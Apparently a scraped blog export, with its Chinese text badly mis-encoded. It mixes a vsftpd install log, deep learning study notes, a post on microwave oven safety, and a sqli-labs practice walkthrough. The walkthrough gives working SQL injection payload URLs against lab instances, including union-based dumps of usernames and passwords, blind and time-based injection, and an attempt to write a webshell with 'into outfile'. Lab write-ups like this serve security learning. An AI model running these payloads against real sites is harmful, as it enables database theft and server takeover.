InReleaseGet:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB] Fetched 2,615 kB in 10s (271 kB/s) Reading package lists... DoneBuilding dependency tree Reading state information... Done49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them. ç¬¬äºŒæ­¥ï¼šå®‰è£…vsftpd1234567891011121314151617181920212223242526272829303132zh@ubuntu:~$ sudo apt install vsftpdReading package lists... DoneBuilding dependency tree Reading state information... DoneThe following additional packages will be installed: ssl-certSuggested packages: openssl-blacklistThe following NEW packages will be installed: ssl-cert vsftpd0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.Need to get 132 kB of archives.After this operation, 402 kB of additional disk space will be used.Do you want to continue? [Y/n] yGet:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]Fetched 132 kB in 3s (50.0 kB/s) Preconfiguring packages ...Selecting previously unselected package ssl-cert.(Reading database ... 71512 files and directories currently installed.)Preparing to unpack .../ssl-cert_1.0.39_all.deb ...Unpacking ssl-cert (1.0.39) Selecting previously unselected package vsftpd..............................................................................] Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] Setting up ssl-cert (1.0.39) ...#################################...........................................................] Progress: [ 56%] [##########################################################................................................] Setting up vsftpd (3.0.3-12) ...########################################################....................................] Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service â†’ /lib/systemd/system/vsftpd.service.............] Processing triggers for man-db (2.9.1-1) Processing triggers for systemd (245.4-4ubuntu3.11) ... ç¬¬ä¸‰æ­¥ï¼šæ·»åŠ ç”¨æˆ·123456zh@ubuntu:~$ sudo nano /etc/vsftpd.confzh@ubuntu:~$ sudo useradd -m ftpuserzh@ubuntu:~$ sudo passwd ftpuserNew password: Retype new password: passwd: password updated successfully ç¬¬å››æ­¥ï¼šæµ‹è¯•1root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"}]},{"title":"Deep Learning from Scratch 3","slug":"deep_learning_from_scratch_3","date":"2021-12-11T08:29:42.485Z","updated":"2021-12-12T01:39:50.058Z","comments":true,"path":"2021/12/11/deep_learning_from_scratch_3/","link":"","permalink":"http://uniqueland.top/2021/12/11/deep_learning_from_scratch_3/","excerpt":"è¯¯å·®åå‘ä¼ æ’­æ³•","text":"è¯¯å·®åå‘ä¼ æ’­æ³• Affine å±‚ï¼ˆä»¿å°„å˜æ¢ï¼‰ ç¥ç»ç½‘ç»œçš„æ­£å‘ä¼ æ’­ä¸­è¿›è¡Œçš„çŸ©é˜µçš„ä¹˜ç§¯è¿ç®—åœ¨å‡ ä½•å­¦é¢†åŸŸè¢«ç§°ä¸ºâ€œä»¿å°„å˜æ¢â€ â€‹ æ³¨ï¼šåœ¨affineå±‚çš„åå‘ä¼ æ’­è¿‡ç¨‹ä¸­è¦æ³¨æ„çŸ©é˜µå½¢çŠ¶ æ¢¯åº¦ç¡®è®¤(gradient check) ç¡®è®¤æ•°å€¼å¾®åˆ†æ±‚å‡ºçš„æ¢¯åº¦ç»“æœå’Œè¯¯å·®åå‘ä¼ æ’­æ³•æ±‚å‡ºçš„ç»“æœæ˜¯å¦ä¸€è‡´çš„æ“ä½œ â€‹ ç”¨äºç¡®è®¤è¯¯å·®åå‘ä¼ æ’­æ³•çš„å®ç°æ˜¯å¦æ­£ç¡® ä¸å­¦ä¹ ç›¸å…³çš„æŠ€å·§æœ€ä¼˜åŒ– è§£å†³â€œå¯»æ‰¾æœ€ä¼˜å‚æ•°çš„é—®é¢˜â€çš„è¿‡ç¨‹ SGD $$W= W-Î·\\frac{\\partial L}{\\partial W}$$ ç¼ºç‚¹ å¦‚æœå‡½æ•°çš„å½¢çŠ¶éå‡å‘(anisotropic)ï¼Œæœç´¢çš„è·¯å¾„å°±ä¼šéå¸¸ä½æ•ˆ æŠµæ¶ˆçš„æ ¹æœ¬åŸå› ï¼šæ¢¯åº¦çš„æ–¹å‘å¹¶æ²¡æœ‰æŒ‡å‘æœ€å°å€¼çš„æ–¹å‘ Momentum $$v=\\alpha v - \\eta \\frac{\\partial L}{\\partial W}$$ $$W=W+v$$ AdaGrad $$h=h+\\frac{\\partial L}{\\partial W} .\\frac{\\partial L}{\\partial W}$$ $$W=W-\\eta \\frac{1}{h^{\\frac{1}{2}}}\\frac{\\partial L}{\\partial W}$$ â€‹ AdaGradä¼šè®°å½•è¿‡å»æ‰€æœ‰æ¢¯åº¦çš„å¹³æ–¹å’Œã€‚å› æ­¤ï¼Œå­¦ä¹ è¶Šæ·±å…¥ï¼Œæ›´æ–°çš„å¹…åº¦å°±è¶Šå°ã€‚å®é™…ä¸Šï¼Œå¦‚æœæ— æ­¢å¢ƒçš„å­¦ä¹ ï¼Œæ›´æ–°é‡å°±ä¼šå˜æˆé›¶ Adam èåˆäº†Momentumå’ŒAdaGradæ–¹æ³•ã€‚é€šè¿‡ç»„åˆå‰é¢ä¸¤ä¸ªæ–¹æ³•çš„ä¼˜ç‚¹ï¼Œæœ‰æœ›å®ç°å‚æ•°ç©ºé—´çš„é«˜æ•ˆæœç´¢ ç‰¹å¾ï¼šè¶…å‚æ•°çš„â€œåç½®æ ¡æ­£â€ æƒé‡çš„åˆå§‹å€¼â€‹ å°†æƒé‡è®¾ç½®ä¸º0çš„é—®é¢˜ â€‹ å¦‚æœå°†æƒé‡è®¾ç½®ä¸ºé›¶ï¼Œé‚£ä¹ˆä¸‹ä¸€å±‚çš„ç¥ç»å…ƒä¼šæ¯ä¼ é€’ç›¸åŒçš„å€¼ï¼Œä»è€Œè¾¾ä¸åˆ°å­¦ä¹ çš„æ•ˆæœï¼ˆä¹˜æ³•åå‘ä¼ æ’­çš„ä¾‹å­ï¼‰ï¼Œåˆ™åœ¨åå‘ä¼ æ’­æ—¶ç¬¬äºŒå±‚çš„æƒé‡è¿›è¡ŒåŒæ ·çš„æ›´æ–°ï¼Œè¿™ä½¿å¾—ç¥ç»ç½‘ç»œæ‹¥æœ‰è®¸å¤šä¸åŒçš„æƒé‡çš„æ„ä¹‰ä¸§å¤±äº†ã€‚å³é˜²æ­¢â€œæƒé‡å‡ä¸€åŒ–â€ï¼ˆç“¦è§£æƒé‡çš„å¯¹ç§°ç»“æ„ï¼‰ æ¢¯åº¦æ¶ˆå¤±ï¼ˆæ¢¯åº¦çˆ†ç‚¸ï¼‰åœ¨è¿ç”¨é“¾å¼æ³•åˆ™æ—¶ï¼Œç”±äºè¿ç®—æ—¶ä»¥è¿ä¹˜çš„å½¢å¼è¿›è¡Œï¼Œæ‰€ä»¥å½“å±‚æ•°å¾ˆæ·±æ—¶ï¼Œéšç€å±‚æ•°çš„å¢åŠ ï¼Œè®¡ç®—å‡ºçš„æ¢¯åº¦ä¼šæŒ‡æ•°çº§å˜åŒ–ï¼Œå¦‚æœæ˜¯å¾€å°äº†å˜ï¼Œå°±å‡ºç°äº†æ¢¯åº¦æ¶ˆå¤±ç°è±¡ï¼Œå¦‚æœæ˜¯å¾€å¤§äº†å˜ï¼Œå°±å‡ºç°äº†æ¢¯åº¦çˆ†ç‚¸ç°è±¡ è¡¨ç°åŠ›å—é™å½“ä¼ é€’ç»™ç¥ç»å…ƒçš„æ˜¯æœ‰æ‰€åå‘çš„æ•°æ®æ—¶ï¼Œæœ‰å¯èƒ½ä¼šå‡ºç°è¡¨ç°åŠ›å—é™çš„é—®é¢˜ï¼Œå³å¤šä¸ªç¥ç»å…ƒè¾“å‡ºç›¸åŒçš„ç»“æœï¼Œé‚£åŒæ ·å¯ä»¥ç”±ä¸€ä¸ªç¥ç»å…ƒå®Œæˆçš„äº‹æƒ…æ— ç–‘ä»¤è¿™äº›ç¥ç»å…ƒçš„å­˜åœ¨å˜å¾—æ— æ„ä¹‰ Xavieråˆå§‹å€¼ å¦‚æœå‰ä¸€å±‚çš„èŠ‚ç‚¹æ•°ä¸ºnï¼Œåˆ™åˆå§‹å€¼ä½¿ç”¨æ ‡å‡†å·®ä¸º1/(n^(1/2))çš„åˆ†å¸ƒ ReLUçš„æƒé‡åˆå§‹å€¼ å½“æ¿€æ´»å‡½æ•°ä½¿ç”¨ReLUæ—¶ï¼Œä¸€èˆ¬æ¨èä½¿ç”¨ReLUä¸“ç”¨çš„åˆå§‹å€¼ï¼Œä¹Ÿç§°ä¸ºâ€œHeåˆå§‹å€¼â€ Heåˆå§‹å€¼ä½¿ç”¨æ ‡å‡†å·®ä¸º(2/n)^(1/2)çš„é«˜æ–¯åˆ†å¸ƒ Batch Nomalization (Batch Norm) ä»¥è¿›è¡Œå­¦ä¹ æ—¶çš„mini-batchä¸ºå•ä½ï¼ŒæŒ‰mini-batchè¿›è¡Œæ­£è§„åŒ– è¿›è¡Œä½¿æ•°æ®åˆ†å¸ƒçš„å‡å€¼ä¸º0ï¼Œæ–¹å·®ä¸º1çš„æ­£è§„åŒ–$$\\mu B=\\frac{1}{m}\\Sigma^m{i=1}x_i$$ $$\\sigma ^2_B=\\frac{1}{m}\\Sigma^m_{i=1}(x_i-\\mu_B)^2$$ $$x_i=\\frac{x_i-\\mu_B}{\\sqrt{\\sigma_B^2+\\epsilon}}$$ ä¼˜ç‚¹ï¼š å¯ä»¥ä½¿å­¦ä¹ å¿«é€Ÿè¿›è¡Œï¼ˆå¯ä»¥å¢å¤§å­¦ä¹ ç‡ï¼‰ ä¸é‚£ä¹ˆä¾èµ–åˆå§‹å€¼ï¼ˆå¯¹äºåˆå§‹å€¼ä¸ç”¨é‚£ä¹ˆç¥ç»è´¨ï¼‰ æŠ‘åˆ¶è¿‡æ‹Ÿåˆï¼ˆé™ä½Dropouç­‰çš„å¿…è¦æ€§ï¼‰ è¿‡æ‹Ÿåˆ åªèƒ½æ‹Ÿåˆè®­ç»ƒæ•°æ®ï¼Œä½†ä¸èƒ½å¾ˆå¥½åœ°æ‹Ÿåˆä¸åŒ…å«åœ¨è®­ç»ƒæ•°æ®ä¸­çš„å…¶ä»–æ•°æ®çš„çŠ¶æ€ åŸå›  æ¨¡å‹æ‹¥æœ‰å¤§é‡å‚æ•°ï¼Œè¡¨ç°åŠ›å¼º è®­ç»ƒæ•°æ®å°‘ æƒå€¼è¡°å‡ é€šè¿‡åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­å¯¹å¤§çš„æƒé‡è¿›è¡Œæƒ©ç½šï¼Œæ¥æŠ‘åˆ¶è¿‡æ‹Ÿåˆ ä¾‹ï¼šä¸ºæŸå¤±å‡½æ•°åŠ ä¸Šæƒé‡çš„å¹³æ–¹èŒƒæ•°ï¼ˆ1/2Î»W^2ï¼‰ Dropout Dropoutæ˜¯ä¸€ç§åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­éšæœºåˆ é™¤ç¥ç»å…ƒçš„æ–¹æ³•ã€‚è®­ç»ƒæ—¶ï¼Œéšæœºé€‰å‡ºéšè—å±‚çš„ç¥ç»å…ƒï¼Œç„¶åå°†å…¶åˆ é™¤ã€‚è¢«åˆ é™¤çš„ç¥ç»å…ƒä¸å†è¿›è¡Œä¿¡å·çš„ä¼ é€’","categories":[],"tags":[{"name":"çŸ¥è¯†è¾“å‡ºã€AI","slug":"çŸ¥è¯†è¾“å‡ºã€AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"å¾®æ³¢ç‚‰ç©¶ç«Ÿæœ‰æ²¡æœ‰è¾å°„","slug":"microwave_oven","date":"2021-11-30T15:24:20.874Z","updated":"2021-12-06T15:39:31.281Z","comments":true,"path":"2021/11/30/microwave_oven/","link":"","permalink":"http://uniqueland.top/2021/11/30/microwave_oven/","excerpt":"éœ‡æƒŠï¼è¿™ä¸ªå¸¸è§çš„å®¶ç”¨ç”µå™¨ç«Ÿæœ‰è¿™ä¹ˆå¤§çš„è¾å°„","text":"éœ‡æƒŠï¼è¿™ä¸ªå¸¸è§çš„å®¶ç”¨ç”µå™¨ç«Ÿæœ‰è¿™ä¹ˆå¤§çš„è¾å°„ ç›´å¥”ä¸»é¢˜ï¼Œå¾®æ³¢ç‚‰å¯¹äººä½“ç©¶ç«Ÿä¼šä¸ä¼šäº§ç”Ÿå±å®³è¦çŸ¥é“å¾®æ³¢ç‚‰æ˜¯å¦ä¼šå¯¹äººä½“äº§ç”Ÿå±å®³ï¼Œå°±å¾—å…ˆçŸ¥é“ä»€ä¹ˆç¨‹åº¦çš„å¾®æ³¢ä¼šå¯¹äººä½“äº§ç”Ÿå±å®³ å¯ä»¥çœ‹å‡ºï¼Œåªè¦50mmä»¥å¤–æ³„éœ²çš„å¾®æ³¢å°äºç­‰äº50W/m^2ï¼Œå°±ä¸ä¼šå¯¹äººä½“é€ æˆå½±å“ï¼Œè€Œå¸‚é¢ä¸Šçš„ç»å¤§å¤šæ•°å¾®æ³¢ç‚‰ä¹Ÿéƒ½æ»¡è¶³è¿™ä¸€æ ‡å‡†ï¼Œå³ä½¿åœ¨ä½¿ç”¨äº†ä¸€æ®µæ—¶é—´åï¼Œè™½ç„¶é—¨æŠŠæ‰‹åŠç‚‰é—¨å¯†å°å¤„å¾®æ³¢æ³„æ¼é‡ç•¥æœ‰ä¸Šå‡ï¼Œä½†ä¹Ÿéƒ½åœ¨æ ‡å‡†ä»¥å†… é¡ºä¾¿è¯´ä¸€å£°ï¼Œå¾®æ³¢ç‚‰çš„äº§ç”Ÿçš„è¾å°„å±äºéç”µç¦»è¾å°„ï¼Œå¹¶ä¸èƒ½ç ´ååˆ†å­ç»“æ„å’Œäº§ç”Ÿç”µç¦»ä½œç”¨ï¼›é¢‘ç‡åœ¨2.45GHzå·¦å³ï¼Œä¹Ÿå°±WIFIçš„é¢‘ç‡ï¼Œè€Œä¸”å¾®æ³¢ç‚‰æ˜¯åœ¨é‡‘å±å®¹å™¨ä¸­å·¥ä½œçš„ï¼Œè¿™äº›é‡‘å±å®¹å™¨èƒ½å¤Ÿå¾ˆå¥½åœ°é™åˆ¶å¾®æ³¢ æ‰€ä»¥ï¼Œå¾®æ³¢ç‚‰ä¸ä¼šå¯¹äººä½“é€ æˆä¼¤å®³ é—®é¢˜è§£ç­”å¾®æ³¢ç‚‰æ³„æ¼çš„è¾å°„ä¼šè‡´ç•¸ï¼Ÿ ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ åŒæ ·æ˜¯2.45GHzå·¦å³çš„é¢‘ç‡ï¼Œæ—¢ç„¶WIFIæ²¡æœ‰è‡´ç•¸ä½œç”¨ï¼Œæƒ³å¿…å¾®æ³¢ç‚‰ä¹Ÿä¸å…·å¤‡è¿™æ ·çš„èƒ½åŠ› å¾®æ³¢ç‚‰åŠ çƒ­é£Ÿç‰©ä¼šäº§ç”Ÿè‡´ç™Œç‰©è´¨ï¼Ÿ ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ æƒ³çŸ¥é“æ˜¯å¦è‡´ç™Œï¼Œå¾—ä»å¾®æ³¢ç‚‰åŠ çƒ­çš„æœ¬è´¨è¯´èµ·å¾®æ³¢ç‚‰åŠ çƒ­çš„å…¶å®æ˜¯é£Ÿç‰©ä¸­çš„æ°´ã€‚å½“å¾®æ³¢è¾å°„åˆ°é£Ÿå“ä¸Šæ—¶ï¼Œæ°´çš„ææ€§åˆ†å­çš„å–å‘å°†éšå¾®æ³¢åœºè€Œå˜åŠ¨ã€‚ç”±äºé£Ÿå“ä¸­æ°´çš„ææ€§åˆ†å­çš„è¿™ç§è¿åŠ¨ï¼Œä»¥åŠç›¸é‚»åˆ†å­é—´çš„ç›¸äº’ä½œç”¨ï¼Œäº§ç”Ÿäº†ç„¦è€³çƒ­ï¼Œä»è€ŒåŠ çƒ­é£Ÿç‰©ï¼Œæ‰€ä»¥å¾®æ³¢ç‚‰åŠ çƒ­ä¸ä¼šäº§ç”Ÿè‡´ç™Œç‰©è´¨ å¾®æ³¢ç‚‰é—¨çš„é‚£å—å¯è§†çª—å£éƒ¨åˆ†æœ‰æ´ï¼Œä¼šä¸ä¼šäº§ç”Ÿè¾å°„å‘¢ï¼Ÿ ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ æ¥äººï¼Œä¸Šå…¬å¼å¯ä»¥çœ‹å‡ºå¾®æ³¢çš„æ³¢é•¿å¤§æ¦‚åœ¨12cmå·¦å³ï¼Œæ¯”å¾®æ³¢ç‚‰é—¨ä¸Šçš„å°æ´ç›´å¾„å¤§å¾—å¤šï¼Œå¾®æ³¢æ ¹æœ¬å‡ºä¸æ¥ å¾®æ³¢ç‚‰åŠ çƒ­çš„é£Ÿå“ï¼Œä¼šä¸ä¼šæ”¹å˜é£Ÿå“æœ¬èº«çš„è¥å…»æˆåˆ†ï¼Ÿ ç‚¹å‡»æŸ¥çœ‹ç­”æ¡ˆ æˆ‘ä»¬è¦æ˜ç™½çš„æ˜¯ï¼šä»»ä½•å½¢å¼çš„çƒ¹é¥ªéƒ½ä¼šç ´åé£Ÿç‰©ä¸­çš„è¥å…»æˆåˆ†ï¼Œä½†å…³é”®çš„å˜é‡æ˜¯çƒ¹é¥ªä¸­æ‰€ç”¨æ°´çš„å¤šå°‘ï¼Œçƒ¹é¥ªçš„æ—¶é—´ï¼Œä»¥åŠæ¸©åº¦ã€‚æ­£å¸¸çš„å¾®æ³¢çƒ¹é¥ªç”±äºæ—¶é—´çŸ­ï¼Œé¿å…äº†ä¼ ç»Ÿçƒ¹é¥ªä¸­é£Ÿç‰©è¡¨é¢æ¸©åº¦è¿‡é«˜çš„å¼Šç«¯ï¼Œæ²¹çƒŸæ›´å°‘ï¼Œæ‰€ä»¥äº§ç”Ÿçš„è‡´ç™Œç‰©ä¹Ÿæ›´å°‘ã€‚è€Œä¸”ï¼Œåœ¨çƒ¹é¥ªæ–¹æ³•ä¸­ï¼Œå¾®æ³¢ç‚‰åŠ çƒ­å¯¹é£Ÿå“è¥å…»æˆåˆ†çš„ä¿æŠ¤æ˜¯å±äºæ¯”è¾ƒå¥½çš„ï¼Œâ€œèƒ½æœ€å¤§é™åº¦åœ°ä¿ç•™é£Ÿå“çš„è¥å…»åŠåŸæœ‰çš„è‰²é¦™å‘³â€ã€‚ èµ„æ–™å‚è€ƒï¼š æ±‚çœŸæµ‹è¯•ï¼šå¾®æ³¢ç‚‰è¾å°„å¤§ï¼Ÿæ¯”æ‰‹æœºå¤§å¤šäº†|é£Ÿå“|å¾®æ³¢ç‚‰|å¾®æ³¢_æ–°æµªç§‘æŠ€_æ–°æµªç½‘ (sina.com.cn) è€çˆ¸è¯„æµ‹ï¼šè®©æˆ‘ä»¬è°ˆè°ˆå…³äºå¾®æ³¢ç‚‰çš„è¾å°„é—®é¢˜_å¾®æ³¢ç‚‰_ä»€ä¹ˆå€¼å¾—ä¹° (smzdm.com) éƒ¨åˆ†å›¾æºå¿…åº”ï¼Œä¾µåˆ ","categories":[],"tags":[{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"}]},{"title":"sqli-labs","slug":"sqli-labs","date":"2021-11-30T05:33:41.039Z","updated":"2022-01-02T03:04:14.353Z","comments":true,"path":"2021/11/30/sqli-labs/","link":"","permalink":"http://uniqueland.top/2021/11/30/sqli-labs/","excerpt":"ç”¨æ ¡å›­ç½‘å¯èƒ½ä¸èƒ½æˆåŠŸå‘é€payloadï¼Œåˆ‡è®°ï¼ï¼ï¼","text":"ç”¨æ ¡å›­ç½‘å¯èƒ½ä¸èƒ½æˆåŠŸå‘é€payloadï¼Œåˆ‡è®°ï¼ï¼ï¼ Less-01 å…ˆåˆ¤æ–­æ˜¯å­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ payloadï¼šhttp://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1 and 1=2â€“+ å†åˆ¤æ–­æ³¨å…¥ç‚¹ payloadï¼šhttp://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,2,3â€“+ æŸ¥çœ‹æ•°æ®åº“åç§° payloadï¼šhttp://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,database(),3â€“+ æŸ¥çœ‹åº“ä¸­çš„è¡¨ payloadï¼šhttp://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=â€securityâ€â€“+ æŸ¥çœ‹ç”¨æˆ·è¡¨ä¸­å­—æ®µ payloadï¼šhttp://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=â€usersâ€â€“+ æŸ¥çœ‹ç”¨æˆ·åå’Œå¯†ç  payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username,password),3 from security.usersâ€“+ æ¢ä¸ªæ–¹å¼æ˜¾ç¤º payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39; union select 1,group_concat(username),group_concat(password) from security.usersâ€“+ Less-02 åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1 åˆ¤æ–­æ³¨å…¥ç‚¹ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+ å¾€ä¸‹æ“ä½œä¸ç¬¬ä¸€é¢˜ç±»ä¼¼ï¼Œpayloadå°±å·®äº†ä¸€ä¸ªå•å¼•å· payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-03 åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1 è¯¥é¢˜ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œä½†ç›´æ¥ä½¿ç”¨è”åˆæ³¨å…¥æŠ¥é”™ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+ æ ¹æ®é¢˜ç›®æç¤ºï¼Œåœ¨idè¡¨ç¤ºçš„æ•°æ®åŠå¼•å·ååŠ ä¸Šæ‹¬å·ï¼Œå†è¿›è¡Œè”åˆæ³¨å…¥ï¼Œæ³¨å…¥æˆåŠŸ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+ å¾€ä¸‹ä¸ç¬¬ä¸€é¢˜ç›¸åŒï¼Œunionåçš„payloadä¸€è‡´ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-04 åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1 ä½¿ç”¨å•å¼•å·è¿›è¡Œé—­åˆï¼ŒæŠ¥é”™ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+ ç»„åˆå•å¼•å·ã€åŒå¼•å·ä»¥åŠæ‹¬å·å¾—åˆ°æ³¨å…¥ç‚¹ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;) union select 1,2,3â€“+ å¾€ä¸‹æ­¥éª¤ä¸ä¸Šè¿°é¢˜ç›®ç›¸åŒ payloadï¼šhttp://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+ Less-05 åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ å›æ˜¾æŠ¥é”™æ•°æ®ï¼Œå°è¯•ç›²æ³¨ payloadï¼šhttp://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+ å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œåˆ‡ç‰‡ï¼Œå†ä¸å„ä¸ªå­—ç¬¦æ¯”è¾ƒï¼Œæ ¹æ®æŠ¥é”™ä¸å¦åˆ¤æ–­æ¯”è¾ƒç»“æœ payloadï¼šhttp://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ æ”¹å˜ä¸Šä¸€ä¸ªpayloadä¸­cçš„å€¼ä»¥éå†å‡ºæ•°æ®åº“åç§°ï¼Œå†ç»“åˆå‰é¢é¢˜ç›®çš„payloadé€æ­¥çˆ†å‡ºè¡¨åå’Œåˆ—å payloadï¼šhttp://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+ åˆ—åä»¥æ­¤ç±»æ¨ å¯ä»¥ç”¨pythonå†™ä¸ªè„šæœ¬æ¥è·‘ï¼Œæˆ–è€…ä½¿ç”¨burpsuite å¦å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨updataxml()å‡½æ•°æ¥è·å–ç›¸å…³ä¿¡æ¯ payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+ Less-06ä¸ä¸Šä¸€é“é¢˜ç±»ä¼¼ï¼Œå°†å•å¼•å·æ¢ä¸ºåŒå¼•å· Less-07 åˆ©ç”¨æ°¸çœŸæ°¸å‡çš„æ¡ä»¶é…åˆandå’Œoråˆ¤æ–­å‚æ•°idçš„é—­åˆæ–¹å¼ payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+ åˆ©ç”¨select xxx into outfile xxx/xxxçš„æ–¹å¼å‘æœåŠ¡å™¨ä¸­å†™å…¥æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;)) union select 1,â€™2â€™,â€â€œ into outfile â€œ./â€œ â€“+ ç”±äºä¸çŸ¥é“ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œæ‰€ä»¥ç›®å‰æ— æ³•å¯¹ä¼ å…¥æ–‡ä»¶çš„æˆåŠŸä¸å¦åšå‡ºåˆ¤æ–­ Less-08 åˆ¤æ–­å‚æ•°é—­åˆæ–¹å¼ payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+ ç”±äºæ³¨å…¥é”™è¯¯æ—¶ä¸å›æ˜¾ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„ç›²æ³¨ payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+ å¾€åæ­¥éª¤ä¸ä¸Šè¿°ç›²æ³¨æ­¥éª¤ä¸€è‡´ Less-09 åœ¨åˆ¤æ–­å‚æ•°é—­åˆæ–¹å¼æ—¶ï¼Œå‘ç°å›æ˜¾ä¸æ”¹å˜ payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+ å°è¯•åŸºäºæ—¶é—´çš„ç›²æ³¨ å¯ä»¥çœ‹åˆ°ç½‘é¡µæ ¹æ®è®¾å®šçš„æ—¶é—´æ­£åœ¨åŠ è½½ï¼Œè¯´æ˜æ³¨å…¥æˆåŠŸ payloadï¼šhttp://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+ 